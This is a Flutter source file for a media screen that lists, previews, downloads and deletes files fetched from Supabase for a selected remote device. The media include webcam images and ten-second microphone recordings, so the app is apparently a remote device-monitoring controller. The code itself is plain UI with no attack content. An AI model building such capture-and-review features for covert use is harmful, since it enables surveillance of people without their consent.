import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:url_launcher/url_launcher.dart';
import '../providers/app_provider.dart';
import '../services/supabase_service.dart';
import '../services/media_saver_service.dart';
import '../constants/theme.dart';

class MediaScreen extends StatefulWidget {
  const MediaScreen({super.key});

  @override
  State<MediaScreen> createState() => _MediaScreenState();
}

class _MediaScreenState extends State<MediaScreen> {
  List<Map<String, dynamic>> _files = [];
  bool _isLoading = true;
  bool _isClearing = false;
  final Set<dynamic> _downloadingIds = {};

  @override
  void initState() {
    super.initState();
    _loadMedia();
  }

  Future<void> _loadMedia() async {
    setState(() => _isLoading = true);
    final provider = Provider.of<AppProvider>(context, listen: false);
    final dev = provider.selectedDevice;
    final deviceId = dev != null ? (dev['device_id'] ?? dev['id']).toString() : null;
    final files = await SupabaseService().getMediaFiles(deviceId);
    if (mounted) {
      setState(() {
        _files = files;
        _isLoading = false;
      });
    }
  }

  Future<void> _clearAllMedia() async {
    final provider = Provider.of<AppProvider>(context, listen: false);
    final dev = provider.selectedDevice;
    final deviceId = dev != null ? (dev['device_id'] ?? dev['id']).toString() : null;

    final confirmed = await showDialog<bool>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text(provider.tr('dialog_clear_media_title')),
        content: Text(provider.tr('dialog_clear_media_msg')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, false),
            child: Text(provider.tr('btn_cancel')),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: AppTheme.statusOffline,
              foregroundColor: Colors.white,
            ),
            onPressed: () => Navigator.pop(ctx, true),
            child: Text(provider.tr('btn_confirm')),
          ),
        ],
      ),
    );

    if (confirmed != true) return;

    setState(() => _isClearing = true);
    try {
      await SupabaseService().clearMediaFiles(deviceId);
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(provider.tr('media_cleared')),
            backgroundColor: AppTheme.statusOnline,
          ),
        );
      }
      await _loadMedia();
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('${provider.tr('cmd_failed')}$e'),
            backgroundColor: AppTheme.statusOffline,
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() => _isClearing = false);
      }
    }
  }

  Future<void> _openUrl(String url) async {
    final uri = Uri.parse(url);
    if (await canLaunchUrl(uri)) {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
    }
  }

  Future<void> _downloadMedia(
      Map<String, dynamic> item, AppProvider provider) async {
    final id = item['id'];
    final url = item['url'] as String? ?? '';
    final isImage = item['is_image'] == true;
    final type = item['type'] as String? ?? 'media';
    if (url.isEmpty) return;

    setState(() => _downloadingIds.add(id));
    try {
      final savedPath = await MediaSaverService.downloadAndSaveMedia(
        url: url,
        isImage: isImage,
        baseName: type,
      );
      if (mounted) {
        final successMsg = isImage
            ? provider.tr('media_saved_gallery')
            : provider.tr('media_saved_downloads');
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('$successMsg\n$savedPath'),
            backgroundColor: AppTheme.statusOnline,
            duration: const Duration(seconds: 4),
          ),
        );
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('${provider.tr('media_save_failed')}$e'),
            backgroundColor: AppTheme.statusOffline,
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() => _downloadingIds.remove(id));
      }
    }
  }

  void _showImageDialog(String name, String url) {
    showDialog(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.all(12),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Align(
              alignment: Alignment.topRight,
              child: IconButton(
                icon: const Icon(Icons.close, color: Colors.white, size: 28),
                onPressed: () => Navigator.pop(ctx),
              ),
            ),
            ClipRRect(
              borderRadius: BorderRadius.circular(16),
              child: Image.network(
                url,
                fit: BoxFit.contain,
                loadingBuilder: (context, child, progress) {
                  if (progress == null) return child;
                  return const Padding(
                    padding: EdgeInsets.all(40),
                    child: CircularProgressIndicator(),
                  );
                },
                errorBuilder: (context, error, stack) => const Padding(
                  padding: EdgeInsets.all(40),
                  child: Text('Failed to load image',
                      style: TextStyle(color: Colors.white)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final provider = Provider.of<AppProvider>(context);
    final isDark = Theme.of(context).brightness == Brightness.dark;

    return Scaffold(
      appBar: AppBar(
        title: Text(provider.tr('media_title')),
        actions: [
          IconButton(
            tooltip: provider.tr('refresh'),
            icon: const Icon(Icons.refresh),
            onPressed: _isLoading || _isClearing ? null : _loadMedia,
          ),
          if (_files.isNotEmpty)
            IconButton(
              tooltip: provider.tr('media_clear'),
              icon: _isClearing
                  ? const SizedBox(
                      width: 18,
                      height: 18,
                      child: CircularProgressIndicator(strokeWidth: 2),
                    )
                  : const Icon(Icons.delete_sweep_outlined, color: AppTheme.statusOffline),
              onPressed: _isClearing ? null : _clearAllMedia,
            ),
        ],
      ),
      body: RefreshIndicator(
        onRefresh: _loadMedia,
        child: _isLoading
            ? const Center(child: CircularProgressIndicator())
            : _files.isEmpty
                ? Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(
                          Icons.perm_media_outlined,
                          size: 64,
                          color: AppTheme.darkTextMuted,
                        ),
                        const SizedBox(height: 16),
                        Text(
                          provider.tr('media_empty'),
                          style: const TextStyle(
                            fontSize: 16,
                            color: AppTheme.darkTextMuted,
                          ),
                        ),
                      ],
                    ),
                  )
                : ListView.builder(
                    padding: const EdgeInsets.all(16),
                    itemCount: _files.length,
                    itemBuilder: (ctx, index) {
                      final item = _files[index];
                      final isImage = item['is_image'] == true;
                      final isAudio = item['is_audio'] == true;
                      final url = item['url'] as String? ?? '';
                      final name = item['name'] as String? ?? '';
                      final type = item['type'] as String? ?? '';

                      Color badgeColor = AppTheme.primaryTeal;
                      if (type == 'webcam') badgeColor = const Color(0xFF8B5CF6);
                      if (type == 'mic_record') badgeColor = AppTheme.accentCyan;

                      final isDownloading = _downloadingIds.contains(item['id']);

                      return Card(
                        margin: const EdgeInsets.only(bottom: 14),
                        clipBehavior: Clip.antiAlias,
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            if (isImage && url.isNotEmpty)
                              GestureDetector(
                                onTap: () => _showImageDialog(name, url),
                                child: Container(
                                  height: 220,
                                  width: double.infinity,
                                  color: Colors.black26,
                                  child: Image.network(
                                    url,
                                    fit: BoxFit.cover,
                                    loadingBuilder: (context, child, progress) {
                                      if (progress == null) return child;
                                      return const Center(
                                        child: CircularProgressIndicator(
                                          strokeWidth: 2,
                                        ),
                                      );
                                    },
                                    errorBuilder: (context, error, stack) =>
                                        const Center(
                                      child: Icon(
                                        Icons.broken_image,
                                        size: 48,
                                        color: AppTheme.darkTextMuted,
                                      ),
                                    ),
                                  ),
                                ),
                              )
                            else if (isAudio)
                              Container(
                                height: 110,
                                width: double.infinity,
                                color: AppTheme.accentCyan.withValues(alpha: 0.1),
                                child: const Center(
                                  child: Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      Icon(
                                        Icons.mic,
                                        size: 44,
                                        color: AppTheme.accentCyan,
                                      ),
                                      SizedBox(width: 12),
                                      Text(
                                        '10s Audio Recording',
                                        style: TextStyle(
                                          fontWeight: FontWeight.bold,
                                          fontSize: 15,
                                        ),
                                      ),
                                    ],
                                  ),
                                ),
                              ),
                            Padding(
                              padding: const EdgeInsets.all(14),
                              child: Row(
                                mainAxisAlignment:
                                    MainAxisAlignment.spaceBetween,
                                children: [
                                  Expanded(
                                    child: Column(
                                      crossAxisAlignment:
                                          CrossAxisAlignment.start,
                                      children: [
                                        Row(
                                          children: [
                                            Container(
                                              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                              decoration: BoxDecoration(
                                                color: badgeColor.withValues(alpha: 0.15),
                                                borderRadius: BorderRadius.circular(6),
                                              ),
                                              child: Text(
                                                type.toUpperCase(),
                                                style: TextStyle(
                                                  color: badgeColor,
                                                  fontWeight: FontWeight.bold,
                                                  fontSize: 10,
                                                ),
                                              ),
                                            ),
                                            const SizedBox(width: 8),
                                            Expanded(
                                              child: Text(
                                                _formatDate(item['created_at']),
                                                style: const TextStyle(
                                                  fontSize: 12,
                                                  color: AppTheme.darkTextMuted,
                                                ),
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                            ),
                                          ],
                                        ),
                                        const SizedBox(height: 6),
                                        Text(
                                          name,
                                          style: TextStyle(
                                            fontWeight: FontWeight.bold,
                                            fontSize: 13,
                                            color: isDark ? Colors.white : const Color(0xFF0F172A),
                                          ),
                                          maxLines: 1,
                                          overflow: TextOverflow.ellipsis,
                                        ),
                                      ],
                                    ),
                                  ),
                                  if (url.isNotEmpty)
                                    Row(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        if (isImage)
                                          IconButton(
                                            tooltip: provider.tr('media_open'),
                                            icon: const Icon(Icons.fullscreen,
                                                size: 22),
                                            onPressed: () =>
                                                _showImageDialog(name, url),
                                          ),
                                        ElevatedButton.icon(
                                          onPressed: isDownloading
                                              ? null
                                              : () => _downloadMedia(
                                                  item, provider),
                                          icon: isDownloading
                                              ? const SizedBox(
                                                  width: 14,
                                                  height: 14,
                                                  child:
                                                      CircularProgressIndicator(
                                                    strokeWidth: 2,
                                                    color: Colors.white,
                                                  ),
                                                )
                                              : const Icon(Icons.download,
                                                  size: 16),
                                          label: Text(isDownloading
                                              ? provider.tr('media_downloading')
                                              : provider.tr('media_download')),
                                          style: ElevatedButton.styleFrom(
                                            padding: const EdgeInsets.symmetric(
                                                horizontal: 12, vertical: 8),
                                            backgroundColor: badgeColor,
                                            foregroundColor: Colors.white,
                                          ),
                                        ),
                                        const SizedBox(width: 4),
                                        IconButton(
                                          tooltip: 'Browser',
                                          icon: const Icon(Icons.open_in_browser,
                                              size: 20),
                                          onPressed: () => _openUrl(url),
                                        ),
                                      ],
                                    ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      );
                    },
                  ),
      ),
    );
  }

  String _formatDate(String? iso) {
    if (iso == null) return '';
    try {
      final dt = DateTime.parse(iso).toLocal();
      return '${dt.year}-${dt.month.toString().padLeft(2, '0')}-${dt.day.toString().padLeft(2, '0')} ${dt.hour.toString().padLeft(2, '0')}:${dt.minute.toString().padLeft(2, '0')}';
    } catch (_) {
      return iso;
    }
  }
}
